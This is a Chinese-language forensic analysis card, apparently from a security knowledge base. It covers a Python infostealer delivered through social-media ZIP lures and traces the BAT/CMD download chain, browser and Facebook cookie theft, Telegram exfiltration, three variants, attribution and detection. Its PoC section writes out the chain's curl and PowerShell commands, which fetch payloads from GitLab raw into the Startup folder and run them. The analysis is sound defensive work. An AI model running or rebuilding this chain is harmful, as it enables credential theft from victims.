---
id: defense-forensics-python-infostealer-messaging-bat-telegram-browser
title: 通讯软件诱饵传播的 Python 信息窃取器：BAT/CMD 两阶段下载链、7 浏览器凭据与 Facebook Cookie、Telegram sendDocument 双通道外传
type: scenario
domain: defense
path: defense/forensics
technique: python-infostealer-messaging-bat-telegram-browser
tags:
- forensics
- malware
- infostealer
- python
- bat
- cmd
- gitlab
- telegram
- browser-credentials
- facebook-cookie
- startup
- pyinstaller
- attribution
- mitre-attack
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V481
  verified_at: '2026-11-10T20:16:40+08:00'
  notes: 已对照原文与22张图核对：SNS诱饵ZIP→阶段一BAT(curl落C:\Users\Public\myFile.zip+Expand-Archive)→vn.cmd(变量替换混淆、start chrome alibaba、GitLab raw st/Document.zip/achung3→project.py)→七浏览器Cookie/密码+Facebook Cookie→Telegram sendDocument双bot/chat外传；变种二RitCucki+scriptcall+pyencode/hoang2、变种三>13MB PyInstaller、rmv.py、demso计数器、越南语归因均与图12-22一致；shoppingvideo247.com来自图2进程树。未验证点：未执行样本，文中GitLab/GitHub账户与Telegram token未访问；变种三持久化代码为图中注释代码。
url: /docs/defense/forensics/defense-forensics-python-infostealer-messaging-bat-telegram-browser/
draft: false
kb_aliases:
- Python 信息窃取器
- SNS 诱饵 ZIP 投递
- BAT 两阶段下载器
- GitLab raw 载荷托管
- Telegram sendDocument 窃密外传
- cookie.txt password.txt cookiefb.txt
- RitCucki 类
- PyInstaller stealer 变种
---

## 一句话结论

该 Python 信息窃取活动通过 Facebook 等社交消息投递含 BAT 的 ZIP：第一阶段 BAT 用 `curl` 把下一级 ZIP 落到 `C:\Users\Public` 并用 PowerShell `Expand-Archive` 解出 CMD 下载器；第二阶段 CMD 用变量替换混淆、先 `start chrome` 访问阿里巴巴做诱饵，再从 GitLab raw 拉取 `WindowsSecure.bat`（写入启动目录持久化）、`Document.zip`（便携 Python 包）与 `project.py` 并用自带解释器执行。`project.py`（变种一）反混淆后收集 7 种浏览器的 Cookie/密码及 Facebook Cookie，按“国家+IP”打包 ZIP，经 Telegram Bot API `sendDocument` 用两套 bot/chat 外传；另有远程分阶段加载的变种二与 PyInstaller 打包的变种三。

## 原理

- **合法平台滥用（LOTS）**：诱饵走 Facebook 等通讯/社交平台，载荷托管在 GitLab/GitHub 公开仓库（`https://gitlab.com/<user>/<repo>/-/raw/<branch>/<file>`、`https://raw.githubusercontent.com/<user>/<repo>/<branch>/<path>`），外传用 `api.telegram.org` Bot API。这些域名信誉高、默认放行、免费稳定，且可随时替换/删除文件；即使是公开 webhook/聊天记录也能承载窃取数据，攻击者无需自建 C2。
- **两阶段下载器**：ZIP 内的初始 BAT（从 WinRAR 解压目录执行）做两件事——`curl -L -o C:\Users\Public\myFile.zip <stage1>/achung3.zip` 与 `powershell -command "Expand-Archive -LiteralPath 'C:\Users\Public\myFile.zip' -DestinationPath 'C:\Users\Public'"`；解出的 `vn.cmd` 才是主下载器。`C:\Users\Public` 是普通用户可写、常被安全产品默认可执行的位置，整链不需要管理员权限。
- **CMD 变量替换混淆**：`vn.cmd` 开头用大量 `set <短变量>=<单字符>` 把命令拆成碎片，再 `setlocal EnableDelayedExpansion`，运行时用 `!变量!` 拼接出 `powershell`、`Invoke-WebRequest`、URL 等关键字，静态搜索看不到完整命令；并非所有变体都使用，属于版本相关特征（还原方法见关联卡）。
- **诱饵与持久化**：脚本第一行 `start chrome https://www.alibaba.com/` 用正常浏览器访问电商主页，制造“用户在上网”的假象并牵制沙箱/人工判断；随后把 `WindowsSecure.bat` 写入当前用户 `Startup` 目录，每次登录用便携 `python.exe` 重新执行 `project.py`（T1547.001 启动文件夹）。
- **窃密面（变种一）**：反混淆后的脚本先请求 ipinfo 获取受害主机 IP 与地理位置（用于画像与后续社工），`main()` 枚举 Brave、Coc Coc、Chromium、Google Chrome、Microsoft Edge、Mozilla Firefox、Opera 七种浏览器的配置目录，把 Cookie/密码导出为 `%TEMP%\{国家}{IP}\` 下的 `cookie.txt`、`password.txt` 等文件；`cookiefb.txt` 专门转储 Facebook Cookie，用于劫持 Facebook 账号、扩大感染面。
- **外传**：把上述文件打包为 `{国家/地区}{IP}.zip`，用 Telegram Bot API 的 `sendDocument` 上传；脚本里存在两处调用，使用不同 bot token 与 chat_id，一处藏在 `Compressed()` 函数的 base64+`exec` 里、一处明文，`caption` 携带 `ID:`、`IP:` 和自增编号；编号由 `C:\Users\Public\Document\number.txt` 的 `demso()` 计数器维护，便于攻击者统计受害者与追踪批次。
- **变种二（远程分阶段）**：改为面向对象结构（`RitCucki` 类），先 GET GitHub raw 上的 `config/scriptcall` 字符串清单，再按行号把字符串分配给 `mkdir/copy/rename/taskkill`、Startup 路径、`%APPDATA%\MyDrivers`、Chrome `Cookies`/`Profile` 路径等变量；随后 GET `pyencode/hoang2`（base64）并用 `{2:str,3:lambda b:bytes(...)}[sys.version_info[0]]` 兼容 py2/py3 后 `exec`。目标浏览器收窄为 Coc Coc、Chrome、Edge 三种。
- **变种三（PyInstaller 打包）**：可执行文件 >13 MB，DetectItEasy 识别为 PE32、Packer: PyInstaller、Overlay: zlib archive；反编译出的主脚本与变种二的阶段载荷相同，且注释掉的代码包含 `%APPDATA%\MyDrivers\WindowsScanner.exe`、Startup 下 `Win32SupportProduct.exe` 的持久化逻辑，说明是同一开发者的 .py/.exe 双形态版本（exe 版持久化被注释，交由外部 BAT 承担）。
- **证据删除**：变种一会删除自身相关脚本；其他版本下载专门的 `rmv.py`，按路径删除 `Document.zip`、`WindowsSecure.zip` 与 `rmv.py` 自身，注释为越南语 `Xoá`（删除）。
- **归因线索**：BAT 注释 `sau khi ghi`（越南语“写完之后”）、函数名 `demso`（越南语“计数”）、文件名 `hoang.exe`/`hoangtuan.exe`、GitLab 账户别名 `Khôi Nguyễn`（`xjnhzaj12b2`）、GitHub 账户 `kylianjacky27`，以及所有变体都支持越南社区常用的 Coc Coc 浏览器，共同指向越南语使用者。

## 触发条件

- 受害者打开社交消息中的 ZIP（内含 BAT）或直接运行携带载荷的压缩包/可执行文件；
- Windows 具备 `curl.exe`、PowerShell、`Expand-Archive`，且 `C:\Users\Public` 与当前用户 Startup 目录可写；
- 主机可出站访问 GitLab/GitHub raw、`api.telegram.org` 与攻击者域名，未被代理/网关按内容拦截；
- 用户再次登录时 Startup 中的 `WindowsSecure.bat` 触发持久化执行；
- 目标浏览器存在可读取的配置目录（脚本以当前用户权限即可读取）。

## 利用步骤（分析与排查顺序）

1. 从 ZIP 内 BAT 提取 `curl` 下载地址与 `Expand-Archive` 目标路径；检查 `C:\Users\Public\myFile.zip`、`Document.zip`、`Document\project.py`、`Document\python.exe`。
2. 检查当前用户 `Startup` 目录是否出现 `WindowsSecure.bat`，读取其内容确认它用便携 Python 重新执行 `project.py`。
3. 还原 `vn.cmd` 变量表：收集所有 `set` 语句，把 `!变量!` 逐层替换成值，得到 `Invoke-WebRequest` 的 GitLab raw URL 与落盘路径（方法见关联卡）。
4. 反混淆 `project.py` 的嵌套压缩：按 `binascii.unhexlify → zlib → bz2 → gzip → lzma → bz2 → marshal.loads` 由内向外逐层解压（只解析不执行），得到浏览器路径、ipinfo 调用、Telegram token/chat_id 与文件打包逻辑。
5. 检查 `%TEMP%` 下以“国家+IP”命名的目录与 `cookie.txt`/`password.txt`/`cookiefb.txt`，以及 `C:\Users\Public\Document\number.txt` 计数器，判断窃密是否已执行。
6. 变种判定：`.py` 形态看是否存在 `RitCucki` 类与 GitHub raw 的 `config/scriptcall`、`pyencode/*` 下载；>13 MB 的 PE 用 DetectItEasy 确认 PyInstaller overlay，反编译主脚本与 .py 版本比对。
7. 提取 IOC：GitLab/GitHub 账户与 raw 路径、Telegram bot token/chat_id、`shoppingvideo247.com` 类分发域名、upstream ZIP 名与哈希；按“先断外联/禁自启、再删文件、最后复查浏览器凭据是否外泄”处置。
8. 处置后建议用户修改浏览器保存的密码、退出并重登 Facebook，审查账号异常登录。

## PoC

```text
# 阶段一（ZIP 内 BAT 的核心命令）
curl -L -o C:\Users\Public\myFile.zip https://<stage1>/achung3.zip
powershell -command "Expand-Archive -LiteralPath 'C:\Users\Public\myFile.zip' -DestinationPath 'C:\Users\Public'"

# 阶段二（vn.cmd 反混淆后的核心动作）
start chrome https://www.alibaba.com/
powershell -windowstyle hidden Invoke-WebRequest -URI https://gitlab.com/<user>/<repo>/-/raw/master/st \
  -OutFile "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecure.bat"
powershell -windowstyle hidden Invoke-WebRequest -URI https://gitlab.com/<user>/<repo>/-/raw/master/Document.zip -OutFile C:\Users\Public\Document.zip
powershell -windowstyle hidden Expand-Archive C:\Users\Public\Document.zip -DestinationPath C:\Users\Public\Document
powershell -windowstyle hidden Invoke-WebRequest -URI https://gitlab.com/<user>/<repo>/-/raw/master/achung3 -OutFile C:\Users\Public\Document\project.py
C:\Users\Public\Document\python C:\Users\Public\Document\project.py
```

```python
# project.py 嵌套压缩反混淆（只解析，不执行）
import binascii, zlib, bz2, gzip, lzma, marshal
raw = b"..."  # 从 exec(...unhexlify(b"...")...) 中提取的十六进制串
code = marshal.loads(bz2.decompress(lzma.decompress(gzip.decompress(
    bz2.decompress(zlib.decompress(binascii.unhexlify(raw)))))))
# 用 dis / 反编译工具读取 code，勿 exec
```

以上命令结构按原文截图整理、域名与账户用占位符；未执行任何样本。

## 变体与关联

- 变种一：`project.py`，七浏览器 + Facebook Cookie + 双 Telegram 通道 + `rmv.py` 证据删除，多层压缩混淆。
- 变种二：`Lib-jae.py`（`RitCucki` 类），远程 `scriptcall` 字符串清单 + `pyencode/*` base64 分阶段载荷，三浏览器。
- 变种三：PyInstaller 可执行文件，主脚本与变种二阶段载荷同源，持久化代码被注释，.py/.exe 双形态。
- 关联：[[defense-forensics-python-stealer-browser-credentials-geofence-ngrok]]（另一 Python 窃密家族的 Chrome/Edge 凭据 + ipinfo 围栏 + ngrok 外传）、[[defense-forensics-snake-keylogger-stealer-collection-exfil-channels]]（Snake Keylogger 的浏览器凭据与 Telegram sendDocument 外传）、[[hardcoded-telegram-bot-token-exfil-channel-hijack]]（提取硬编码 bot token 反查/反制外传通道）。
- 关联：[[pentest-initial-access-multi-vector-bat-portable-python-startup]]（同类 BAT + 便携 Python + Startup 加载链，不同诱饵与托管域名）、[[pentest-c2-github-raw-payload-hosting-commit-attribution]]（GitHub raw 托管与 commit 归因）、[[code-analysis-reverse-unpacking-python-nested-marshal-consts-chain]]（Python 多层压缩+marshal 套娃还原）、[[code-analysis-reverse-obfuscation-cmd-bat-variable-substitution]]（本链 CMD 变量替换混淆的还原方法）。
- 边界：GitLab/GitHub/Telegram 可能封禁账户与文件；企业网络若对 raw 代码托管域名与 Telegram API 做内容检查/阻断，链条会断；Coc Coc 等浏览器目录结构变化会导致窃密失败。

## 检测与防御

- 检测（主机）：WinRAR/资源管理器拉起 `cmd.exe` 后紧跟 `curl.exe`/`powershell.exe` 的进程链；`C:\Users\Public` 下出现 ZIP/`Document` 目录与 `python.exe`；Startup 目录出现 `WindowsSecure.bat`；`%TEMP%` 下“国家+IP”命名目录与 `number.txt`；`python.exe` 子进程调用 `tasklist`。
- 检测（网络）：内网主机直接访问 `gitlab.com/*/-/raw/*`、`raw.githubusercontent.com` 下载脚本/压缩包；向 `api.telegram.org/bot*/sendDocument` POST 文件；访问 `shoppingvideo247.com` 类新域名。
- 防御：开启 Windows Defender ASR（阻止 Office/脚本类进程创建可执行内容、阻止来自压缩包的可执行文件）、限制 `C:\Users\Public` 执行、监控 Startup 目录写入；代理/网关对 raw 托管域名与 Telegram API 做审计与告警；EDR 对“压缩软件→cmd→curl/powershell”链式行为打分。
- 加固：浏览器保存密码与 Cookie 是核心资产，建议使用独立密码管理器、敏感账号开启二次验证并定期检查登录设备；禁用或限制便携 Python 在用户目录运行。
